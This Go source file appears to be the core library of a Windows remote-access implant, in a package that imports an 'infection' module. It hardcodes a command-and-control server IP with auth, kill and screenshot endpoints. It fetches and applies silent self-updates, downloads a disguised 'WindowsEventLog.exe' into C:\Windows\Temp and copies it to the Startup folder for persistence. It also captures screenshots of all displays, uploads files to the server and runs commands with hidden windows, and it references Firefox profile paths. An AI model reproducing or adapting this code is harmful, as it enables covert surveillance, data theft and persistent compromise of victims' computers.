package lib

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/inconshreveable/go-update"
	"github.com/kbinani/screenshot"
	"github.com/parnurzeal/gorequest"
	"image/png"
	"infection/machineinfo"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
)

const VERSION string = "4"
const MIDURL string = "http://111.231.82.173/"
const MIDFILE string = "http://111.231.82.173/file/"
const MIDAUTH string = "http://111.231.82.173:9000/auth"
const MIDETCD string = "111.231.82.173:2379"
const MIDKILLIP string = "http://111.231.82.173:9000/Killip"
const ALLKILL string = "http://111.231.82.173:9000/Allkill"
const GETSCREEN string = "http://111.231.82.173:9000/getpic"
const CLEARPIC = "http://111.231.82.173:9000/clearpic"
const CURRENTPATHLOG = "C:\\Windows\\Temp\\log.txt"
const CURRENTPATH = "C:\\Windows\\Temp\\"
const NOGUILOG = "C:\\Windows\\Temp\\nogui.txt"

var HOSTID = machineinfo.GetSystemVersion().Hostid
var BrowserSafepath = get_current_user() + "\\tmp\\"
var Firefox = get_current_user() + "\\fire\\"
var Firefoxpath = get_current_user() + "\\appdata\\Roaming\\Mozilla\\Firefox\\Profiles"
var AUTOSTART = get_current_user() + "\\appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
var OUTIP string

type Msg struct {
	Hostid string `json:"hostid"`
	Code   int    `json:"code"`
}

// get out ip
func GetOutIp() {
	body, _ := ioutil.ReadFile(CURRENTPATH + "ip.txt")
	OUTIP = strings.TrimSpace(string(body))
}

func get_current_user() string {
	usr, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}
	return usr.HomeDir
}
func RandInt64(min, max int64) int {
	rand.Seed(time.Now().UnixNano())
	return int(min + rand.Int63n(max-min+1))
}

//ioop check version update
func DoUpdate() {
	for {
		ticker := time.NewTicker(time.Second * time.Duration(RandInt64(35, 180)))
		resp, err := http.Get(MIDFILE + "noguiversion.txt")
		if err != nil {
			log.Println(err)
		}
		body, _ := ioutil.ReadAll(resp.Body)
		defer resp.Body.Close()
		current_file := strings.Split(os.Args[0], "\\")
		frpe, err := http.Get(MIDFILE + current_file[len(current_file)-1])
		if strings.TrimSpace(string(body)) != VERSION {
			err = update.Apply(frpe.Body, update.Options{TargetPath: os.Args[0]})
			if err != nil {
				// error handling
			}
			time.Sleep(2 * time.Second)
			// when update done shlb be kill main process
			KillMain()
		}
		<-ticker.C
	}
}

func ClearPic() {
	cmd := exec.Command("cmd", "/C", "del", CURRENTPATH+".png")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()
}
func SingleFile(file string, addr string, finflag chan string) {
	pbuf := new(bytes.Buffer)
	writer := multipart.NewWriter(pbuf)
	formFile, err := writer.CreateFormFile("file", file)
	if err != nil {
		log.Println("Create form file failed: %s\n", err)
	}
	// 从文件读取数据，写入表单
	srcFile, err := os.Open(file)
	if err != nil {
		fmt.Println("Open source file failed: s\n", err)
	}
	defer srcFile.Close()
	_, err = io.Copy(formFile, srcFile)
	if err != nil {
		fmt.Println("Write to form file falied: %s\n", err)
	}
	// 发送表单
	contentType := writer.FormDataContentType()
	writer.Close()
	re, err := http.Post(addr, contentType, pbuf)
	if re.StatusCode == 200 {
		os.RemoveAll(file)
		log.Println("Upload single file Status Successful !")
	} else {
		log.Println("Upload single file Status Fail !")
	}
	finflag <- "file sent"
	return
}
func GetTargetPath() (string, error) {
	file, err := exec.LookPath(os.Args[0])
	if err != nil {
		return "", err
	}
	path, err := filepath.Abs(file)
	if err != nil {
		return "", err
	}
	i := strings.LastIndex(path, "/")
	if i < 0 {
		i = strings.LastIndex(path, "\\")
	}
	if i < 0 {
		return "", fmt.Errorf(`error: Can't find "/" or "\".`)
	}
	return string(path), nil
}

func Removetempimages(filenames []string, finflag chan string) {
	for _, name := range filenames {
		os.Remove(name)
	}
}

func KillCheck() {
	killcheck := exec.Command("taskkill", "/f", "/im", "WindowsEventLog.exe")
	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	// not Start will continue
	killcheck.Run()
}

func KillALL() {
	KillCheck()
	current_file := strings.Split(os.Args[0], "\\")
	killcheck := exec.Command("taskkill", "/f", "/im", current_file[len(current_file)-1])
	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	killcheck.Run()
}
func KillMain() {
	current_file := strings.Split(os.Args[0], "\\")
	killcheck := exec.Command("taskkill", "/f", "/im", current_file[len(current_file)-1])
	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	killcheck.Run()
}
func AutoStart() {
	time.Sleep(6 * time.Second)
	move := exec.Command("cmd", "/C", "copy", CURRENTPATH+"WindowsEventLog.exe", AUTOSTART+"WindowsEventLog.exe")
	move.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	// not Start will continue
	move.Run()
}
func MultiFileDown(files []string, step string) {
	if len(files) == 0 && step == "init" {
		var fileinit = []struct {
			Name string
		}{
			{"WindowsEventLog.exe"},
			{"sqlite3_386.dll"},
			{"sqlite3_amd64.dll"},
		}
		for _, name := range fileinit {
			Get(MIDFILE+name.Name, name.Name)
		}
	}
}

func Get(url string, file string) {
	resp, err := http.Get(url)
	if err != nil {
		return
	}
	body, _ := ioutil.ReadAll(resp.Body)
	ioutil.WriteFile(CURRENTPATH+file, body, 0644)
}

type Check struct {
	Hostid string `json:"hostid"`
}

func CheckInlib(addr string) error {
	var check Check
	msg := Msg{
		Hostid: HOSTID,
	}
	resp, body, _ := gorequest.New().
		Post("http://" + addr + ":5002/machine/machineCheck").
		//Set("content-type", "application/x-www-form-urlencoded").
		Send(msg).
		End()
	if resp.StatusCode == 200 && body != "" {
		if err := json.Unmarshal([]byte(body), &check); err == nil {
			if check.Hostid == HOSTID {
				return nil
			} else {
				return fmt.Errorf("not inlib")
			}

		}
	}
	return fmt.Errorf("not inlib")
}

func FileExits(path string) error {
	_, err := os.Stat(path)
	if err != nil {
		return err
	}
	return nil
}

func ErrorStatusCode(code int, hostid string, addr string) {
	msg := Msg{
		Hostid: hostid,
		Code:   code,
	}
	_, _, _ = gorequest.New().
		Post(addr).
		Set("content-type", "application/x-www-form-urlencoded").
		Send(msg).
		End()
}

//get hostid-ip-screensize pic
func Getscreenshot() []string {
	n := screenshot.NumActiveDisplays()
	filenames := []string{}
	var fpth string
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		if runtime.GOOS == "windows" {
			fpth = `C:\Windows\Temp\`
		} else {
			fpth = `/tmp/`
		}
		GetOutIp()
		fileName := fmt.Sprintf("%s-%s-%d-%dx%d.png", HOSTID, OUTIP, i, bounds.Dx(), bounds.Dy())
		fullpath := fpth + fileName
		filenames = append(filenames, fullpath)
		file, _ := os.Create(fullpath)

		defer file.Close()
		png.Encode(file, img)
	}
	return filenames
}

func Compress(files []*os.File, dest string) error {
	d, _ := os.Create(dest)
	defer d.Close()
	w := zip.NewWriter(d)
	defer w.Close()
	for _, file := range files {
		// need to target dir exits first
		err := compress(file, "", w)
		if err != nil {
			return err
		}
	}

	return nil
}
func compress(file *os.File, prefix string, zw *zip.Writer) error {
	info, err := file.Stat()
	if err != nil {
		return err
	}
	if info.IsDir() {
		prefix = prefix + "/" + info.Name()
		fileInfos, err := file.Readdir(-1)
		if err != nil {
			return err
		}
		for _, fi := range fileInfos {
			f, err := os.Open(file.Name() + "/" + fi.Name())
			if err != nil {
				return err
			}
			err = compress(f, prefix, zw)
			if err != nil {
				return err
			}
		}
	} else {
		header, err := zip.FileInfoHeader(info)
		header.Name = prefix + "/" + header.Name
		if err != nil {
			return err
		}
		writer, err := zw.CreateHeader(header)
		if err != nil {
			return err
		}
		_, err = io.Copy(writer, file)
		file.Close()
		if err != nil {
			return err
		}
	}
	return nil
}

//func SystemCheck(){
//	switch runtime.GOOS {
//	case "windows":
//		current_file := strings.Split(os.Args[0], "\\")
//		c := exec.Command("cmd", "/C", "taskkill", "/IM",current_file[len(current_file)-1])
//		if err := c.Run(); err != nil {
//			fmt.Println("Error: ", err)
//		}
//	case "linux":
//	case "darwin":
//
//	case "freebsd":
//
//	}
//}
